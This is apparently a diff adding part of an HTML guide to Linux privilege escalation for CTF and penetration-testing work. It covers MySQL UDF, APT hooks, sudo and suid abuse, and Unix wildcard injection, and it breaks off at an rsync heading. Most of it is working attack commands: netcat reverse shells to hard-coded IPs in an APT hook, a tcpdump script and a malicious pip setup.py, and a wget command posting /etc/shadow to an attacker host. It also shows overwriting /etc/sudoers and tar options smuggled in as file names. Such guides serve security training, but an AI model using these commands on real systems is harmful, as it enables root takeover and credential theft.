+<p>The output of that program will be (using python 2.x.x):</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">root</span>
+<span class="go">bob</span>
+</pre></div>
+</div>
+<p>If bob runs the program without sudo privileges with</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">./myscript.py</span>
+</pre></div>
+</div>
+<p>he will get the following output:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">bob</span>
+<span class="go">None</span>
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+<section id="mysql-privileged-escalation">
+<h3>MySQL Privileged Escalation<a class="headerlink" href="#mysql-privileged-escalation" title="Link to this heading"></a></h3>
+<p>If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize <a class="reference external" href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">User-Defined Function (UDF) Dynamic Library Exploit</a> . Refer <a class="reference external" href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">Gaining a root shell using mysql user defined functions and setuid binaries</a></p>
+<section id="more-information">
+<h4>More Information<a class="headerlink" href="#more-information" title="Link to this heading"></a></h4>
+<ul class="simple">
+<li><p>The MySQL service should really not run as root. The service and all mysql directories should be run and accessible from another account - mysql as an example.</p></li>
+<li><p>When MySQL is initialized, it creates a master account (root by default) that has all privileges to all databases on MySQL. This root account differs from the system root account, although it might still have the same password due to default install steps offered by MySQL.</p></li>
+<li><p>Commands can be executed inside MySQL, however, commands are executed as the current logged in user.</p></li>
+</ul>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mysql&gt; \! sh</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="cron-d">
+<h3>Cron.d<a class="headerlink" href="#cron-d" title="Link to this heading"></a></h3>
+<p>Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.</p>
+<section id="pspy">
+<h4>pspy<a class="headerlink" href="#pspy" title="Link to this heading"></a></h4>
+<p><a class="reference external" href="https://github.com/DominicBreuker/pspy">pspy - unprivileged linux process snooping</a>  is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.
+Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.</p>
+<p>The tool gathers it’s info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes. It is a great tool to search for cron jobs running.</p>
+</section>
+</section>
+<section id="unattended-apt-upgrade">
+<h3>Unattended APT - Upgrade<a class="headerlink" href="#unattended-apt-upgrade" title="Link to this heading"></a></h3>
+<p>If we have a ability to upload files to the host at any location (For. example misconfigured TFTP server) and APT-Update/ Upgrade is running at a set interval (Basically unattended-upgrade or via-a-cronjob), then we can use APT-Conf to run commands</p>
+<section id="dpkg">
+<h4>DPKG<a class="headerlink" href="#dpkg" title="Link to this heading"></a></h4>
+<p>Debconf configuration is initiated with following line. The command in brackets could be any arbitrary command to be executed in shell.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Dpkg::Pre-Install-Pkgs {&quot;/usr/sbin/dpkg-preconfigure --apt || true&quot;;};</span>
+</pre></div>
+</div>
+<p>There are also options</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Dpkg::Pre-Invoke {&quot;command&quot;;};</span>
+<span class="go">Dpkg::Post-Invoke {&quot;command&quot;;};</span>
+</pre></div>
+</div>
+<p>They execute commands before/ after apt calls dpkg. Post-Invoke which is invoked after every execution of dpkg (by an apt tool, not manually);</p>
+</section>
+<section id="apt">
+<h4>APT<a class="headerlink" href="#apt" title="Link to this heading"></a></h4>
+<ul class="simple">
+<li><p>APT::Update::Pre-Invoke {“your-command-here”};</p></li>
+<li><p>APT::Update::Post-Invoke-Success, which is invoked after successful updates (i.e. package information updates, not upgrades);</p></li>
+<li><p>APT::Update::Post-Invoke, which is invoked after updates, successful or otherwise (after the previous hook in the former case).</p></li>
+</ul>
+<p>To invoke the above, create a file in  /etc/apt/apt.conf.d/ folder specifying the NN&lt;Name&gt; and keep the code in that</p>
+<p>For example:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">APT::Update::Post-Invoke{&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f&quot;;};</span>
+</pre></div>
+</div>
+<p>When the apt-update would be executed, it would be executed as root and we would get a shell as a root.</p>
+</section>
+</section>
+<section id="sudo-l-permissions">
+<h3>SUDO -l Permissions<a class="headerlink" href="#sudo-l-permissions" title="Link to this heading"></a></h3>
+<p>Let’s see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find,  zip and package installers (pip, npm).</p>
+<section id="vi">
+<h4>vi<a class="headerlink" href="#vi" title="Link to this heading"></a></h4>
+<p>If the user can run <cite>vi</cite> as sudo</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">User picoplayer may run the following commands on challenge:</span>
+<span class="go">  (ALL) /usr/bin/vi</span>
+</pre></div>
+</div>
+<p>then, we can launch <cite>vi</cite> as <cite>sudo vi</cite> and run a shell from it using <cite>:!/bin/sh</cite></p>
+</section>
+<section id="nmap-suid">
+<h4>nmap suid<a class="headerlink" href="#nmap-suid" title="Link to this heading"></a></h4>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script &lt;(echo &#39;require &quot;os&quot;.execute &quot;/bin/sh&quot;&#39;)</span>
+</pre></div>
+</div>
+<p>or</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --interactive</span>
+</pre></div>
+</div>
+</section>
+<section id="tee-suid">
+<h4>tee suid<a class="headerlink" href="#tee-suid" title="Link to this heading"></a></h4>
+<p>If tee is suid: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any_script.sh, which can then be run as root by a user. If some script is run as root, you may also run. For example, let’s say tidy.sh is executed as root on the server, we can write the below code in temp.sh</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">temp.sh</span>
+<span class="go">echo &quot;example_user ALL=(ALL) ALL&quot; &gt; /etc/sudoers</span>
+</pre></div>
+</div>
+<p>or</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">chmod +w /etc/sudoers to add write properties to sudoers file to do the above</span>
+</pre></div>
+</div>
+<p>and then</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</span>
+</pre></div>
+</div>
+<p>which will add contents of temp.sh to tidyup.sh. (Assuming tidyup.sh is running as root by crontab)</p>
+</section>
+<section id="tcpdump">
+<h4>tcpdump<a class="headerlink" href="#tcpdump" title="Link to this heading"></a></h4>
+<p>The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).</p>
+<p>Create a temp.sh ( which contains the commands to executed as root )</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">id</span>
+<span class="go">/bin/nc 192.168.110.1 4444 -e /bin/bash</span>
+</pre></div>
+</div>
+<p>Execute the command</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root</span>
+</pre></div>
+</div>
+<p>where</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">-C file_size : Before  writing a raw packet to a savefile, check whether the file is currently larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after the first savefile will have the name specified with the -w flag, with a number after it, starting at 1 and continuing upward.  The units of file_size are millions of bytes (1,000,000 bytes, not 1,048,576 bytes).</span>
+
+<span class="go">-W Used  in conjunction with the -C option, this will limit the number of files created to the specified number, and begin overwriting files from the beginning, thus creating a &#39;rotating&#39; buffer.  In addition, it will name the files with enough leading 0s to support the maximum number of files, allowing them to sort correctly. Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit. If used with -C as well, the behavior will result in cyclical files per timeslice.</span>
+
+<span class="go">-z postrotate-command Used in conjunction with the -C or -G options, this will make tcpdump run &quot; postrotate-command file &quot; where file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip will compress each savefile using gzip or bzip2.</span>
+
+<span class="go">Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn&#39;t disturb the capture process.</span>
+
+<span class="go">And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the only argument, make the flags &amp;  arguments arrangements and execute the command that you want.</span>
+
+<span class="go"> -Z user</span>
+<span class="go"> --relinquish-privileges=user If tcpdump is running as root, after opening the capture device or input savefile, but before opening any savefiles for output, change the user ID to user and the group ID to the primary group of user.</span>
+
+<span class="go"> This behavior can also be enabled by default at compile time.</span>
+</pre></div>
+</div>
+</section>
+<section id="zip">
+<h4>zip<a class="headerlink" href="#zip" title="Link to this heading"></a></h4>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">touch /tmp/exploit</span>
+<span class="go">sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=&quot;sh -c /bin/bash&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="find">
+<h4>find<a class="headerlink" href="#find" title="Link to this heading"></a></h4>
+<p>If find is suid, we can use</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">touch foo</span>
+<span class="go">find foo -exec whoami \;</span>
+</pre></div>
+</div>
+<p>Here, the foo file (a blank file) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.</p>
+<p>HollyGrace has mentioned this in <a class="reference external" href="https://www.gracefulsecurity.com/linux-privesc-abusing-suid/">Linux PrivEsc: Abusing SUID</a> More can be learn <a class="reference external" href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">How-I-got-root-with-sudo</a>.</p>
+</section>
+<section id="wget">
+<h4>wget<a class="headerlink" href="#wget" title="Link to this heading"></a></h4>
+<p>If the user has permission to run wget as sudo, we can read files (if the user whom we are sudo-ing have the permisson to read) by using –post-file parameter</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.</span>
+</pre></div>
+</div>
+<p>Example:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo -u root wget --post-file=/etc/shadow http://AttackerIP:Port</span>
+</pre></div>
+</div>
+<p>On the attacker side, there can be a nc listener. The above would send the contents of /etc/shadow to the listener in the post request.</p>
+</section>
+<section id="package-installation">
+<h4>Package Installation<a class="headerlink" href="#package-installation" title="Link to this heading"></a></h4>
+<section id="pip">
+<h5>pip<a class="headerlink" href="#pip" title="Link to this heading"></a></h5>
+<p>If the user have been provided permission to install packages as a sudo for example</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">User username may run the following commands on hostname:</span>
+<span class="go">   (root) /usr/bin/pip install *</span>
+</pre></div>
+</div>
+<p>We can exploit this by creating a custom pip package which would provide us a shell.</p>
+<p>First, create a folder (Let’s name it helloworld), and create two files setup.py and helloworld.py</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">username@hostname:/tmp/helloworld$ </span>ls
+<span class="go">helloworld.py setup.py</span>
+</pre></div>
+</div>
+<p>Let’s see, what setup.py contains</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="n">setup</span><span class="o">.</span><span class="n">py</span>
+
+<span class="kn">from</span> <span class="nn">setuptools</span> <span class="kn">import</span> <span class="n">setup</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="nb">print</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.26 4444 &gt;/tmp/f&quot;</span><span class="p">)</span>
+
+<span class="n">setup</span><span class="p">(</span>
+    <span class="n">name</span><span class="o">=</span><span class="s1">&#39;helloworld-script&#39;</span><span class="p">,</span>    <span class="c1"># This is the name of your PyPI-package.</span>
+    <span class="n">version</span><span class="o">=</span><span class="s1">&#39;0.1&#39;</span><span class="p">,</span>               <span class="c1"># Update the version number for new releases</span>
+    <span class="n">scripts</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;helloworld&#39;</span><span class="p">]</span>       <span class="c1"># The name of your scipt, and also the command you&#39;ll be using for calling it</span>
+<span class="p">)</span>
+</pre></div>
+</div>
+<p>and helloworld.py</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="n">helloworld</span><span class="o">.</span><span class="n">py</span>
+<span class="c1">#!/usr/bin/env python</span>
+<span class="nb">print</span> <span class="s2">&quot;Hello World&quot;</span>
+</pre></div>
+</div>
+<p>The above can be a part of a sample package of python pip. For more details refer <a class="reference external" href="https://github.com/pypa/sampleproject">A sample project that exists for PyPUG’s “Tutorial on Packaging and Distributing Projects”</a> , <a class="reference external" href="http://python-packaging.readthedocs.io/en/latest/index.html">How To Package Your Python Code</a> ,
+<a class="reference external" href="https://stackoverflow.com/questions/22051360/a-simple-hello-world-setuptools-package-and-installing-it-with-pip">A simple Hello World setuptools package and installing it with pip</a>
+and <a class="reference external" href="https://packaging.python.org/tutorials/distributing-packages/">Packaging and distributing projects</a></p>
+<p>The above package can be installed by using</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo -u root /usr/bin/pip install -e /tmp/helloworld</span>
+
+<span class="go">Obtaining file:///tmp/helloworld</span>
+</pre></div>
+</div>
+<p>The above would execute setup.py and provide us the shell.</p>
+<p>Refer <a class="reference external" href="https://packaging.python.org/tutorials/installing-packages/">Installing Packages</a> for different ways to install a pip package</p>
+<p>Let’s see the installed application</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">pip list</span>
+<span class="go">Flask-CouchDB (0.2.1)</span>
+<span class="go">helloworld-script (0.1, /tmp/helloworld)</span>
+<span class="go">Jinja2 (2.10)</span>
+</pre></div>
+</div>
+</section>
+<section id="npm">
+<h5>npm<a class="headerlink" href="#npm" title="Link to this heading"></a></h5>
+<p>npm allows packages to take actions that could result in a malicious npm package author to create a worm that spreads across the majority of the npm ecosystem. Refer <a class="reference external" href="https://www.kb.cert.org/vuls/id/319816">npm fails to restrict the actions of malicious npm packages</a>
+, <a class="reference external" href="https://github.com/joaojeronimo/rimrafall">npm install could be dangerous: Rimrafall</a> and <a class="reference external" href="https://blog.npmjs.org/post/141702881055/package-install-scripts-vulnerability">Package install scripts vulnerability</a></p>
+</section>
+</section>
+</section>
+<section id="unix-wildcards">
+<h3>Unix Wildcards<a class="headerlink" href="#unix-wildcards" title="Link to this heading"></a></h3>
+<p>The below text is directly from the <a class="reference external" href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">DefenseCode Unix WildCards Gone Wild</a>.</p>
+<section id="chown-file-reference-trick-file-owner-hijacking">
+<h4>Chown file reference trick (file owner hijacking)<a class="headerlink" href="#chown-file-reference-trick-file-owner-hijacking" title="Link to this heading"></a></h4>
+<p>First really interesting target I’ve stumbled across is ‘chown’. Let’s say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to ‘nobody’. Pay attention to the file owners in the following files list.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>ls<span class="w"> </span>-al
+<span class="go">total 52</span>
+<span class="go">drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .</span>
+<span class="go">drwx------. 22 user user 4096 Oct 28 17:34 ..</span>
+<span class="go">-rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php</span>
+<span class="go">-rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php</span>
+<span class="go">-rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php</span>
+<span class="go">-rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php</span>
+<span class="go">-rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php</span>
+<span class="go">-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php</span>
+<span class="go">-rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php</span>
+<span class="go">-rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php</span>
+<span class="go">-rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php</span>
+<span class="go">-rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php</span>
+<span class="go">-rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php</span>
+<span class="go">-rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php</span>
+<span class="go">-rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php</span>
+<span class="go">-rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php</span>
+</pre></div>
+</div>
+<p>Files in this public directory are mostly owned by the user named ‘user’, and root user will now change that to ‘nobody’.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>chown<span class="w"> </span>-R<span class="w"> </span>nobody:nobody<span class="w"> </span><span class="se">\*</span>.php
+</pre></div>
+</div>
+<p>Let’s see who owns files now…</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">root@defensecode public]# </span>ls<span class="w"> </span>-al
+<span class="go">total 52</span>
+<span class="go">drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .</span>
+<span class="go">drwx------. 22 user user 4096 Oct 28 17:34 ..</span>
+<span class="go">-rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php</span>
+<span class="go">-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php</span>
+<span class="go">-rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php</span>
+</pre></div>
+</div>
+<p>Something is not right. What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group ‘nobody’, but somehow, all files are owned by the user ‘leon’ now. If we take closer look, this directory previously contained just the following two files created and owned by the user ‘leon’.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php</span>
+<span class="go">-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php</span>
+</pre></div>
+</div>
+<p>Thing is that wildcard character used in ‘chown’ command line took arbitrary ‘–reference=.drf.php’ file and passed it to the chown command at the command line as an option.</p>
+<p>Let’s check chown manual page (man chown):</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">--reference=RFILE     use RFILE&#39;s owner and group rather than specifying OWNER:GROUP values</span>
+</pre></div>
+</div>
+<p>So in this case, ‘–reference’ option to ‘chown’ will override ‘nobody:nobody’ specified as the root, and new owner of files in this directory will be exactly same as the owner of ‘.drf.php’, which is in this case user ‘leon’. Just for the record, ‘.drf’ is short for Dummy Reference File. :)</p>
+<p>To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument  to the –reference option, file that’s owned by some other user, not ‘leon’, in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership of files to arbitrary users, and practically “hijack” files that are of interest to us.</p>
+<p>Even more, if user ‘leon’ previously created a symbolic link in that directory that points to let’s say /etc/shadow, ownership of /etc/shadow would also be changed to the user ‘leon’.</p>
+</section>
+<section id="chmod-file-reference-trick">
+<h4>Chmod file reference trick<a class="headerlink" href="#chmod-file-reference-trick" title="Link to this heading"></a></h4>
+<p>Another interesting attack vector similar to previously described ‘chown’ attack is ‘chmod’. Chmod also has –reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. Chmod manual page (man chmod):</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">--reference=RFILE    :   use RFILE&#39;s mode instead of MODE values</span>
+</pre></div>
+</div>
+<p>Example is presented below.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>ls<span class="w"> </span>-al
+<span class="go">total 68</span>
+<span class="go">drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .</span>
+<span class="go">drwx------. 24 user user  4096 Oct 28 18:32 ..</span>
+<span class="go">-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php</span>
+<span class="go">-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php</span>
+<span class="go">-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php</span>
+<span class="go">-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php</span>
+<span class="go">-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php</span>
+<span class="go">-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php</span>
+<span class="go">-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php</span>
+<span class="go">-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php</span>
+<span class="go">-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php</span>
+<span class="go">-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php</span>
+<span class="go">-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php</span>
+<span class="go">-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php</span>
+<span class="go">-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php</span>
+</pre></div>
+</div>
+<p>Superuser will now try to set mode 000 on all files.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>chmod<span class="w"> </span><span class="m">000</span><span class="w"> </span>*
+</pre></div>
+</div>
+<p>Let’s check permissions on files…</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>ls<span class="w"> </span>-al
+<span class="go">total 68</span>
+<span class="go">drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .</span>
+<span class="go">drwx------. 24 user user  4096 Oct 28 18:32 ..</span>
+<span class="go">-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php</span>
+<span class="go">-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php</span>
+<span class="go">-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php</span>
+<span class="go">-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php</span>
+<span class="go">-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php</span>
+<span class="go">-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php</span>
+<span class="go">-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php</span>
+<span class="go">-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php</span>
+<span class="go">-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php</span>
+<span class="go">-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php</span>
+<span class="go">-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php</span>
+<span class="go">-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php</span>
+<span class="go">-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php</span>
+</pre></div>
+</div>
+<p>What happened? Instead of 000, all files are now set to mode 777 because of the ‘–reference’ option supplied through file name..Once again,file .drf.php owned by user ‘leon’ with mode 777 was used as reference file and since –reference option is supplied, all files will be set to mode 777. Beside just –reference option, attacker can also create another file with ‘-R’ filename, to change file permissions on files in   all subdirectories recursively.</p>
+</section>
+<section id="tar-arbitrary-command-execution">
+<h4>Tar arbitrary command execution<a class="headerlink" href="#tar-arbitrary-command-execution" title="Link to this heading"></a></h4>
+<p>Previous example is nice example of file ownership hijacking. Now, let’s go to even more interesting stuff like arbitrary command execution.            Tar is very common unix program for creating and extracting archives. Common usage for lets say creating archives is:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>tar<span class="w"> </span>cvvf<span class="w"> </span>archive.tar<span class="w"> </span>*
+</pre></div>
+</div>
+<p>So, what’s the problem with ‘tar’? Thing is that tar has many options,and among them, there some pretty interesting options from arbitrary parameter injection point of view. Let’s check tar manual page (man tar):</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">--checkpoint[=NUMBER]      : display progress messages every NUMBERth record (default 10)</span>
+<span class="go">--checkpoint-action=ACTION : execute ACTION on each checkpoint</span>
+</pre></div>
+</div>
+<p>There is ‘–checkpoint-action’ option, that will specify program which will be executed when checkpoint is reached. Basically, that allows us arbitrary command execution.</p>
+<p>Check the following directory:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>ls<span class="w"> </span>-al
+<span class="go">total 72</span>
+<span class="go">drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .</span>
+<span class="go">drwx------. 24 user user  4096 Oct 28 18:32 ..</span>
+<span class="go">-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php</span>
+<span class="go">-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php</span>
+<span class="go">-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1</span>
+<span class="go">-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh</span>
+<span class="go">-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php</span>
+<span class="go">-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php</span>
+<span class="go">-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php</span>
+<span class="go">-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php</span>
+<span class="go">-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php</span>
+<span class="go">-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php</span>
+<span class="go">-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php</span>
+<span class="go">-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php</span>
+<span class="go">-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php</span>
+<span class="go">-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</span>
+</pre></div>
+</div>
+<p>Now, for example, root user wants to create archive of all files in current directory.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>tar<span class="w"> </span>cf<span class="w"> </span>archive.tar<span class="w"> </span>*
+<span class="go">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span>
+</pre></div>
+</div>
+<p>Boom! What happened? /usr/bin/id command gets executed! We’ve just achieved arbitrary command execution under root privileges. Once again, there are few files created by user ‘leon’.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">  -rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1</span>
+<span class="go">  -rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh</span>
+<span class="go">  -rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</span>
+
+<span class="go">Options &#39;--checkpoint=1&#39; and &#39;--checkpoint-action=exec=sh shell.sh&#39; are passed to the &#39;tar&#39; program as command line options. Basically, they command tar to execute shell.sh shell script upon the execution.</span>
+</pre></div>
+</div>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>cat<span class="w"> </span>shell.sh
+<span class="go">/usr/bin/id</span>
+</pre></div>
+</div>
+<p>So, with this tar argument pollution, we can basically execute arbitrary commands with privileges of the user that runs tar. As demonstrated on the ‘root’ account above.</p>
+</section>
+<section id="rsync-arbitrary-command-execution">
+<h4>Rsync arbitrary command execution<a class="headerlink" href="#rsync-arbitrary-command-execution" title="Link to this heading"></a></h4>
